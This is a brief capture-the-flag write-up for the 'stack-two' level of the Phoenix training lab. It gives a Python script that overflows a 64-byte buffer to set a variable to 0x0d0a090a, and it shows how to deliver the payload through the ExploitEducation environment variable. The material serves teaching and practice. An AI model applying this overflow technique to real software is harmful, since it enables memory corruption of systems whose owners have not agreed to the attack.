# stack-two
#### Script
```python
import sys 

value = 0x0d0a090a
inject = (b'A'*64) + value.to_bytes(4,'little')

sys.stdout.buffer.write(inject)
```
#### Analysis 
According to the challenge description, the *changeme* variable must be changed to **0x0d0a090a**. This is similar to the previous challenges, where we write enough data to overwrite the buffer and then put in our desired value. 

However, this challenge adds a new layer, as the input to the program is no longer taken from stdin, but from an [environment variable](https://www.geeksforgeeks.org/environment-variables-in-linux-unix/) called *ExploitEducation*. Knowing this, we must first set this variable in order to get *changeme* to our desired value. 

#### Solution
We use the script written above to set the environment variable in our .bashrc file.
```shell
...

export ExploitEducation=$(python3 /opt/phoenix/amd64/scripts/stack_two.py)

```
